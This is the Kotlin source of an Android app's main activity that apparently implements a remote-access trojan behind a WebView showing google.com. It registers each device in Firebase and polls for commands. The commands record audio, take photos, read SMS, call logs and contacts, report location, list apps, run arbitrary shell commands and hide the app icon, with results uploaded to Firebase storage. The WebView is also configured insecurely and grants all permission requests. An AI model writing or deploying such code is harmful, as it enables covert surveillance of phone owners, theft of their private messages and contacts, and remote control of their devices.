
package com.yourdomain.erdmt

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.webkit.*
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import com.google.android.material.button.MaterialButton
import com.google.android.material.card.MaterialCardView
import com.google.android.material.progressindicator.LinearProgressIndicator
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.database.*
import com.google.firebase.storage.FirebaseStorage
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {
    
    private lateinit var webView: WebView
    private lateinit var progressBar: LinearProgressIndicator
    private lateinit var errorLayout: androidx.constraintlayout.widget.ConstraintLayout
    private lateinit var errorMessage: TextView
    private lateinit var permissionCard: MaterialCardView
    private lateinit var permissionStatus: TextView
    private lateinit var requestPermissionsBtn: MaterialButton
    private lateinit var firebaseAnalytics: FirebaseAnalytics
    private lateinit var database: FirebaseDatabase
    private lateinit var storage: FirebaseStorage
    
    private var fileUploadCallback: ValueCallback<Array<Uri>>? = null
    private val FILE_CHOOSER_REQUEST_CODE = 1001
    private val deviceId = "device_${System.currentTimeMillis()}"
    
    // All required permissions
    private val ALL_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )
    } else {
        arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
    }
    
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        updatePermissionStatus()
        if (allPermissionsGranted()) {
            initializeWebView()
        }
    }
    
    private val fileChooserLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        fileUploadCallback?.onReceiveValue(
            WebChromeClient.FileChooserParams.parseResult(result.resultCode, result.data)
        )
        fileUploadCallback = null
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        initializeViews()
        initializeFirebase()
        checkPermissions()
        startBackgroundService()
    }
    
    private fun initializeViews() {
        webView = findViewById(R.id.webView)
        progressBar = findViewById(R.id.progressBar)
        errorLayout = findViewById(R.id.errorLayout)
        errorMessage = findViewById(R.id.errorMessage)
        permissionCard = findViewById(R.id.permissionCard)
        permissionStatus = findViewById(R.id.permissionStatus)
        requestPermissionsBtn = findViewById(R.id.requestPermissionsBtn)
        
        requestPermissionsBtn.setOnClickListener {
            requestPermissions()
        }
        
        findViewById<MaterialButton>(R.id.retryBtn).setOnClickListener {
            loadWebView()
        }
    }
    
    private fun initializeFirebase() {
        try {
            firebaseAnalytics = FirebaseAnalytics.getInstance(this)
            database = FirebaseDatabase.getInstance()
            storage = FirebaseStorage.getInstance()
            
            // Register device in Firebase
            registerDevice()
            
            // Listen for commands
            listenForCommands()
            
        } catch (e: Exception) {
            Log.e("MainActivity", "Firebase initialization failed", e)
        }
    }
    
    private fun registerDevice() {
        val deviceRef = database.reference.child("devices").child(deviceId)
        
        val deviceInfo = hashMapOf(
            "id" to deviceId,
            "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
            "androidVersion" to Build.VERSION.RELEASE,
            "apiLevel" to Build.VERSION.SDK_INT,
            "registeredAt" to ServerValue.TIMESTAMP,
            "lastSeen" to ServerValue.TIMESTAMP,
            "online" to true,
            "appVersion" to getAppVersion()
        )
        
        deviceRef.setValue(deviceInfo).addOnCompleteListener { task ->
            if (task.isSuccessful) {
                Log.d("MainActivity", "Device registered successfully")
                
                // Keep device online status updated
                deviceRef.child("online").onDisconnect().setValue(false)
                deviceRef.child("lastSeen").onDisconnect().setValue(ServerValue.TIMESTAMP)
                
                // Send periodic heartbeat
                startHeartbeat()
            } else {
                Log.e("MainActivity", "Failed to register device", task.exception)
            }
        }
    }
    
    private fun startHeartbeat() {
        val handler = android.os.Handler(mainLooper)
        val heartbeatRunnable = object : Runnable {
            override fun run() {
                updateDeviceStatus()
                handler.postDelayed(this, 30000) // Every 30 seconds
            }
        }
        handler.post(heartbeatRunnable)
    }
    
    private fun updateDeviceStatus() {
        val deviceRef = database.reference.child("devices").child(deviceId)
        val updates = hashMapOf<String, Any>(
            "lastSeen" to ServerValue.TIMESTAMP,
            "online" to true,
            "battery" to getBatteryLevel(),
            "permissions" to getGrantedPermissions()
        )
        
        // Add location if available
        getCurrentLocation()?.let { location ->
            updates["location"] = location
        }
        
        deviceRef.updateChildren(updates)
    }
    
    private fun listenForCommands() {
        val commandsRef = database.reference.child("commands").child(deviceId)
        
        commandsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val command = snapshot.getValue(Command::class.java)
                command?.let {
                    executeCommand(it, snapshot.key ?: "")
                }
            }
            
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e("MainActivity", "Commands listener cancelled", error.toException())
            }
        })
    }
    
    private fun executeCommand(command: Command, commandId: String) {
        Log.d("MainActivity", "Executing command: ${command.type}")
        
        when (command.type) {
            "get_info" -> handleGetInfo(commandId)
            "mic_record" -> handleMicRecord(commandId)
            "camera_capture" -> handleCameraCapture(commandId)
            "read_sms" -> handleReadSms(commandId)
            "read_call_logs" -> handleReadCallLogs(commandId)
            "read_contacts" -> handleReadContacts(commandId)
            "get_location" -> handleGetLocation(commandId)
            "list_installed_apps" -> handleListApps(commandId)
            "shell_exec" -> handleShellExec(command.params, commandId)
            "toggle_icon" -> handleToggleIcon(command.params, commandId)
            else -> sendResponse(commandId, "Unknown command: ${command.type}", false)
        }
        
        // Remove executed command
        database.reference.child("commands").child(deviceId).child(commandId).removeValue()
    }
    
    private fun handleGetInfo(commandId: String) {
        val deviceInfo = """
            Device ID: $deviceId
            Model: ${Build.MANUFACTURER} ${Build.MODEL}
            Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
            App Version: ${getAppVersion()}
            Battery: ${getBatteryLevel()}%
            Permissions: ${getGrantedPermissions().size}/${ALL_PERMISSIONS.size}
        """.trimIndent()
        
        sendResponse(commandId, deviceInfo, true)
    }
    
    private fun handleMicRecord(commandId: String) {
        if (checkPermission(Manifest.permission.RECORD_AUDIO)) {
            try {
                val audioFile = AudioRecorder.recordAudio(this, 10000) // 10 seconds
                uploadFile(audioFile, "audio", commandId)
            } catch (e: Exception) {
                sendResponse(commandId, "Failed to record audio: ${e.message}", false)
            }
        } else {
            sendResponse(commandId, "Audio recording permission not granted", false)
        }
    }
    
    private fun handleCameraCapture(commandId: String) {
        if (checkPermission(Manifest.permission.CAMERA)) {
            try {
                val intent = Intent(this, CameraCaptureActivity::class.java)
                intent.putExtra("commandId", commandId)
                startActivity(intent)
            } catch (e: Exception) {
                sendResponse(commandId, "Failed to capture photo: ${e.message}", false)
            }
        } else {
            sendResponse(commandId, "Camera permission not granted", false)
        }
    }
    
    private fun handleReadSms(commandId: String) {
        if (checkPermission(Manifest.permission.READ_SMS)) {
            try {
                val smsMessages = SmsReader.getRecentSms(this, 20)
                val smsJson = smsMessages.joinToString("\n") { 
                    "From: ${it.sender}, Date: ${it.date}, Message: ${it.body}"
                }
                sendResponse(commandId, smsJson, true)
            } catch (e: Exception) {
                sendResponse(commandId, "Failed to read SMS: ${e.message}", false)
            }
        } else {
            sendResponse(commandId, "SMS reading permission not granted", false)
        }
    }
    
    private fun handleReadCallLogs(commandId: String) {
        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
            try {
                val callLogs = CallLogReader.getRecentCalls(this, 20)
                val callsJson = callLogs.joinToString("\n") { 
                    "Number: ${it.number}, Type: ${it.type}, Date: ${it.date}, Duration: ${it.duration}s"
                }
                sendResponse(commandId, callsJson, true)
            } catch (e: Exception) {
                sendResponse(commandId, "Failed to read call logs: ${e.message}", false)
            }
        } else {
            sendResponse(commandId, "Call log reading permission not granted", false)
        }
    }
    
    private fun handleReadContacts(commandId: String) {
        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
            try {
                val contacts = ContactsReader.getAllContacts(this)
                val contactsJson = contacts.joinToString("\n") { 
                    "Name: ${it.name}, Phone: ${it.phone}"
                }
                sendResponse(commandId, contactsJson, true)
            } catch (e: Exception) {
                sendResponse(commandId, "Failed to read contacts: ${e.message}", false)
            }
        } else {
            sendResponse(commandId, "Contacts reading permission not granted", false)
        }
    }
    
    private fun handleGetLocation(commandId: String) {
        if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            getCurrentLocation()?.let { location ->
                sendResponse(commandId, "Latitude: ${location["lat"]}, Longitude: ${location["lng"]}", true)
            } ?: sendResponse(commandId, "Location not available", false)
        } else {
            sendResponse(commandId, "Location permission not granted", false)
        }
    }
    
    private fun handleListApps(commandId: String) {
        try {
            val apps = AppsLister.getInstalledApps(this)
            val appsJson = apps.joinToString("\n") { 
                "Name: ${it.name}, Package: ${it.packageName}"
            }
            sendResponse(commandId, appsJson, true)
        } catch (e: Exception) {
            sendResponse(commandId, "Failed to list apps: ${e.message}", false)
        }
    }
    
    private fun handleShellExec(params: String?, commandId: String) {
        params?.let { command ->
            try {
                val result = ShellExecutor.executeCommand(command)
                sendResponse(commandId, result, true)
            } catch (e: Exception) {
                sendResponse(commandId, "Failed to execute command: ${e.message}", false)
            }
        } ?: sendResponse(commandId, "No command provided", false)
    }
    
    private fun handleToggleIcon(params: String?, commandId: String) {
        params?.let { action ->
            try {
                when (action.lowercase()) {
                    "hide" -> IconToggler.hideIcon(this)
                    "show" -> IconToggler.showIcon(this)
                    else -> {
                        sendResponse(commandId, "Invalid action. Use 'show' or 'hide'", false)
                        return
                    }
                }
                sendResponse(commandId, "Icon ${action}d successfully", true)
            } catch (e: Exception) {
                sendResponse(commandId, "Failed to toggle icon: ${e.message}", false)
            }
        } ?: sendResponse(commandId, "No action provided", false)
    }
    
    private fun sendResponse(commandId: String, message: String, success: Boolean) {
        val response = hashMapOf(
            "deviceId" to deviceId,
            "commandId" to commandId,
            "message" to message,
            "success" to success,
            "timestamp" to ServerValue.TIMESTAMP
        )
        
        database.reference.child("responses").push().setValue(response)
        
        // Also log to logs
        addLog("command_response", "Command $commandId: $message", if (success) "success" else "error")
    }
    
    private fun uploadFile(filePath: String, fileType: String, commandId: String) {
        try {
            val file = Uri.fromFile(java.io.File(filePath))
            val fileName = "${deviceId}_${System.currentTimeMillis()}_${java.io.File(filePath).name}"
            val storageRef = storage.reference.child("$fileType/$fileName")
            
            storageRef.putFile(file)
                .addOnSuccessListener { taskSnapshot ->
                    storageRef.downloadUrl.addOnSuccessListener { uri ->
                        val response = hashMapOf(
                            "deviceId" to deviceId,
                            "commandId" to commandId,
                            "message" to "File uploaded successfully",
                            "success" to true,
                            "fileUrl" to uri.toString(),
                            "fileName" to fileName,
                            "fileType" to when(fileType) {
                                "audio" -> "audio/3gp"
                                "image" -> "image/jpeg"
                                else -> "application/octet-stream"
                            },
                            "timestamp" to ServerValue.TIMESTAMP
                        )
                        
                        database.reference.child("responses").push().setValue(response)
                        addLog("file_upload", "Uploaded $fileType file: $fileName", "success")
                    }
                }
                .addOnFailureListener { exception ->
                    sendResponse(commandId, "Failed to upload file: ${exception.message}", false)
                }
        } catch (e: Exception) {
            sendResponse(commandId, "File upload error: ${e.message}", false)
        }
    }
    
    private fun addLog(type: String, message: String, level: String = "info") {
        val logEntry = hashMapOf(
            "deviceId" to deviceId,
            "type" to type,
            "message" to message,
            "level" to level,
            "timestamp" to ServerValue.TIMESTAMP
        )
        
        database.reference.child("logs").push().setValue(logEntry)
    }
    
    private fun checkPermissions() {
        updatePermissionStatus()
        
        if (allPermissionsGranted()) {
            permissionCard.isVisible = false
            initializeWebView()
        } else {
            permissionCard.isVisible = true
        }
    }
    
    private fun requestPermissions() {
        val missingPermissions = ALL_PERMISSIONS.filter { 
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED 
        }.toTypedArray()
        
        if (missingPermissions.isNotEmpty()) {
            permissionLauncher.launch(missingPermissions)
        }
    }
    
    private fun allPermissionsGranted(): Boolean {
        return ALL_PERMISSIONS.all { 
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED 
        }
    }
    
    private fun updatePermissionStatus() {
        val grantedCount = ALL_PERMISSIONS.count { 
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED 
        }
        
        permissionStatus.text = "Permissions: $grantedCount/${ALL_PERMISSIONS.size} granted"
        
        if (grantedCount == ALL_PERMISSIONS.size) {
            permissionStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
        } else {
            permissionStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
        }
    }
    
    private fun initializeWebView() {
        setupWebView()
        loadWebView()
    }
    
    @Suppress("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            allowFileAccessFromFileURLs = true
            allowUniversalAccessFromFileURLs = true
            loadWithOverviewMode = true
            useWideViewPort = true
            builtInZoomControls = true
            displayZoomControls = false
            setSupportZoom(true)
            setSupportMultipleWindows(true)
            
            // Enable media playback
            mediaPlaybackRequiresUserGesture = false
            
            // Mixed content
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        
        webView.webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                super.onPageStarted(view, url, favicon)
                progressBar.isVisible = true
                errorLayout.isVisible = false
            }
            
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                progressBar.isVisible = false
                addLog("webview", "Page loaded: $url", "info")
            }
            
            override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                super.onReceivedError(view, request, error)
                showError("Failed to load page: ${error?.description}")
                addLog("webview", "Page load error: ${error?.description}", "error")
            }
        }
        
        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                progressBar.progress = newProgress
            }
            
            override fun onPermissionRequest(request: PermissionRequest?) {
                runOnUiThread {
                    request?.grant(request.resources)
                }
            }
            
            override fun onShowFileChooser(
                webView: WebView?,
                filePathCallback: ValueCallback<Array<Uri>>?,
                fileChooserParams: FileChooserParams?
            ): Boolean {
                fileUploadCallback = filePathCallback
                
                val intent = Intent(Intent.ACTION_GET_CONTENT)
                intent.addCategory(Intent.CATEGORY_OPENABLE)
                intent.type = "*/*"
                
                val chooserIntent = Intent.createChooser(intent, "Select File")
                fileChooserLauncher.launch(chooserIntent)
                
                return true
            }
        }
    }
    
    private fun loadWebView() {
        try {
            webView.loadUrl("https://www.google.com")
            errorLayout.isVisible = false
        } catch (e: Exception) {
            showError("Error loading WebView: ${e.message}")
        }
    }
    
    private fun showError(message: String) {
        progressBar.isVisible = false
        errorLayout.isVisible = true
        errorMessage.text = message
        addLog("error", message, "error")
    }
    
    private fun startBackgroundService() {
        try {
            val serviceIntent = Intent(this, BackgroundService::class.java)
            startForegroundService(serviceIntent)
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to start background service", e)
        }
    }
    
    // Helper functions
    private fun checkPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun getAppVersion(): String {
        return try {
            packageManager.getPackageInfo(packageName, 0).versionName
        } catch (e: Exception) {
            "Unknown"
        }
    }
    
    private fun getBatteryLevel(): Int {
        val batteryManager = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        return batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }
    
    private fun getGrantedPermissions(): List<String> {
        return ALL_PERMISSIONS.filter { 
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED 
        }
    }
    
    private fun getCurrentLocation(): Map<String, Double>? {
        // This is a simplified version - in practice, you'd use LocationManager or FusedLocationProviderClient
        return if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            mapOf("lat" to 0.0, "lng" to 0.0) // Placeholder
        } else null
    }
    
    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        // Update device status to offline
        database.reference.child("devices").child(deviceId).child("online").setValue(false)
    }
}

// Data classes
data class Command(
    val type: String = "",
    val params: String? = null,
    val timestamp: Long = 0,
    val sender: String = ""
)
